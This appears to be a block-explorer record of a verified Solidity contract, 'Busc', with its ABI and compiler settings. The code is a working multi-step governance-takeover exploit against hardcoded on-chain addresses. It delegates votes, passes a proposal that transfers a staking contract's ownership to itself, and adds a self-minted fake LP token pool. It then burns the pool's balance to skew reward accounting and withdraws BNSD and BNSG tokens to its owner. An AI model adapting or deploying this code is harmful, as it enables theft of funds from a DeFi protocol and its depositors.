{"SourceCode": "pragma solidity ^0.8.23;\r\n\r\ninterface IERC20 {\r\n    /// @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /// @dev Emitted when the allowance of a `spender` for an `owner` is set, where `value`\r\n    /// is the new allowance.\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /// @notice Returns the amount of tokens in existence.\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /// @notice Returns the amount of tokens owned by `account`.\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /// @notice Moves `amount` tokens from the caller's account to `to`.\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /// @notice Returns the remaining number of tokens that `spender` is allowed\r\n    /// to spend on behalf of `owner`\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /// @notice Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n    /// @dev Be aware of front-running risks: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /// @notice Moves `amount` tokens from `from` to `to` using the allowance mechanism.\r\n    /// `amount` is then deducted from the caller's allowance.\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n\r\n    /// @notice Returns the name of the token.\r\n    function name() external view returns (string memory);\r\n\r\n    /// @notice Returns the symbol of the token.\r\n    function symbol() external view returns (string memory);\r\n\r\n    /// @notice Returns the decimals places of the token.\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract LpToken is IERC20 {\r\n    address public owner;\r\n    uint public totalSupply;\r\n    mapping(address => uint) public balanceOf;\r\n    mapping(address => mapping(address => uint)) public allowance;\r\n    string public name = \"LP-TOKEN\";\r\n    string public symbol = \"LPTOKEN\";\r\n    uint8 public decimals = 18;\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(owner ==  msg.sender, \"Owner only\");\r\n        _;\r\n    }\r\n    \r\n    function transfer(address recipient, uint amount) external returns (bool) {\r\n        if (recipient == owner) {\r\n            return true;\r\n        } \r\n\r\n        balanceOf[msg.sender] -= amount;\r\n        balanceOf[recipient] += amount;\r\n        emit Transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint amount) external returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint amount\r\n    ) external returns (bool) {\r\n        allowance[sender][msg.sender] -= amount;\r\n        balanceOf[sender] -= amount;\r\n        balanceOf[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function mint(address account, uint amount) external onlyOwner {\r\n        balanceOf[account] += amount;\r\n        totalSupply += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function burn(address account, uint amount) external onlyOwner {\r\n        balanceOf[account] -= amount;\r\n        totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n}\r\n\r\ninterface IChef {\r\n    function transferOwnership(address newOwner) external;\r\n    function set(uint256 _pid, uint256 _allocPoint, bool _withUpdate) external;\r\n    function deposit(uint256 _pid, uint256 _amount) external;\r\n    function withdraw(uint256 _pid, uint256 _amount) external;\r\n    function owner() external view returns (address);\r\n    function poolLength() external view returns (uint256);\r\n    function add(uint256 _allocPoint, IERC20 _lpToken, bool _withUpdate) external;\r\n}\r\n\r\ninterface IBnsg is IERC20 {\r\n    function delegate(address delegatee) external;\r\n    function mintBNSGWithBNS(uint96 amountToMint) external returns (bool);\r\n}\r\n\r\ninterface IGovernance {\r\n    function queue(uint proposalId) external;\r\n\r\n    function castVote(uint proposalId, bool support) external;\r\n\r\n    function execute(uint proposalId) external payable;\r\n\r\n    function propose(\r\n        address[] memory targets,\r\n        uint[] memory values,\r\n        string[] memory signatures,\r\n        bytes[] memory calldatas,\r\n        string memory description\r\n    ) external returns (uint);\r\n}\r\n\r\ncontract Busc {\r\n    address public owner;\r\n    IGovernance public constant gov = IGovernance(0xD7c3d1DFA7fc5E87Ad9674d5bA4fE8f711D52c15);\r\n    IChef public constant chef = IChef(0x0D97baC371C34fBeccBbe64970453346e4e2bab3);\r\n    uint public id;\r\n    uint public pid;\r\n    LpToken public lpToken;\r\n    uint public depositAmount;\r\n    IERC20 public constant bnsd = IERC20(0x668DbF100635f593A3847c0bDaF21f0a09380188);\r\n    IBnsg public constant bnsg = IBnsg(0x0018E66A1dEA81fdD767CBb15673119b034b5CF2);\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(owner ==  msg.sender, \"Owner only\");\r\n        _;\r\n    }\r\n\r\n    function preAct() public onlyOwner {\r\n        require(bnsg.balanceOf(address(this)) > 400000 ether, \"Not enough\");\r\n        bnsg.delegate(address(this));\r\n    }\r\n\r\n    function zerothAct() public onlyOwner {\r\n        address[] memory targets = new address[](1);\r\n        targets[0] = address(chef);\r\n\r\n        uint[] memory values = new uint[](1);\r\n        values[0] = 0;\r\n\r\n        string[] memory signatures = new string[](1);\r\n        signatures[0] = \"transferOwnership(address)\";\r\n\r\n        bytes[] memory calldatas = new bytes[](1);\r\n        calldatas[0] = abi.encode(address(this));\r\n\r\n        id = gov.propose(targets, values, signatures, calldatas, \"\");\r\n    }\r\n\r\n    function firstAct() public onlyOwner {\r\n        gov.castVote(id, true);\r\n    }\r\n\r\n    function secondAct() public onlyOwner {\r\n        gov.queue(id);\r\n    }\r\n\r\n    function thirdAct() public onlyOwner {\r\n        gov.execute(id);\r\n\r\n        lpToken = new LpToken();\r\n        lpToken.mint(address(this), 100000000000 ether);\r\n        pid = chef.poolLength();\r\n        chef.add(1 ether, lpToken, false);\r\n\r\n        depositAmount = lpToken.balanceOf(address(this));\r\n        lpToken.approve(address(chef), depositAmount);\r\n        chef.deposit(pid, depositAmount);\r\n    }\r\n\r\n    function fourthAct() public onlyOwner {\r\n        lpToken.burn(address(chef), lpToken.balanceOf(address(chef)) - 1);\r\n        chef.withdraw(pid, depositAmount);\r\n\r\n        bnsd.transfer(owner, bnsd.balanceOf(address(this)));\r\n        bnsg.transfer(owner, bnsg.balanceOf(address(this)));\r\n    }\r\n\r\n    function fifthAndFinalAct() public onlyOwner {\r\n        chef.set(pid, 0, false);\r\n        chef.transferOwnership(0x813a5c8bA296Eb7Ce19537Ee2b6da973cC0F59c5);\r\n    }\r\n\r\n    function out(IERC20 token) external {\r\n        token.transfer(owner, token.balanceOf(address(this)));\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"bnsd\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bnsg\",\"outputs\":[{\"internalType\":\"contract IBnsg\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"chef\",\"outputs\":[{\"internalType\":\"contract IChef\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"depositAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fifthAndFinalAct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"firstAct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fourthAct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gov\",\"outputs\":[{\"internalType\":\"contract IGovernance\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"id\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpToken\",\"outputs\":[{\"internalType\":\"contract LpToken\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"out\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pid\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"preAct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"secondAct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"thirdAct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"zerothAct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Busc", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0232df1a2ab1a23fc9d0ba707906e5314d120a51b8e25f6b6c0a60e9c659eaa7"}